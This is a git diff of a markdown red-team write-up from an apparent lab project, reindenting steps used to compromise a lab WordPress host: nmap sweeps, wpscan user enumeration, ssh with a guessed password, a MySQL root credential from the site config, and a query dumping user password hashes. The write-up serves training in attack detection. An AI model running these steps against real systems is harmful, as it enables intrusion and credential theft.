@@ -74,16 +74,16 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
    
       - Nmap Ping Sweep of the entire network
-          `Nmap -sP 192.168.1.1-255`
+`Nmap -sP 192.168.1.1-255`
 
       - Nmap Service Scan of Target 1
-          `Nmap -sV 192.168.1.110`
+`Nmap -sV 192.168.1.110`
 
       - Wordpress Enumeration with wpscan
-          `wpscan --url http://192.168.1.110/wordpress -eu`
+`wpscan --url http://192.168.1.110/wordpress -eu`
 
       -I Was able to guess a password of one of the users and ssh
-            `ssh michael@192.168.1.110`
+`ssh michael@192.168.1.110`
 
 - `flag3.txt`
 
@@ -96,11 +96,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 ![WordPress Cat](https://github.com/BQcybersec/Projects/blob/main/Project%203%20Monitoring%20an%20Attack%20With%20Elk/Images/red.07.wordpresscat.png)
 
-        `root:R@v3nSecurity`
-        `mysql -u root -p`
+`root:R@v3nSecurity`
+`mysql -u root -p`
 ![MySQL Login](https://github.com/BQcybersec/Projects/blob/main/Project%203%20Monitoring%20an%20Attack%20With%20Elk/Images/red.08.MySQL-Login.png)
        
-        `select * from wp_users`
+`select * from wp_users`
 
 ![mySQL hash extraction](https://github.com/BQcybersec/Projects/blob/main/Project%203%20Monitoring%20an%20Attack%20With%20Elk/Images/red.09.mysqlhashextraction.png)
 
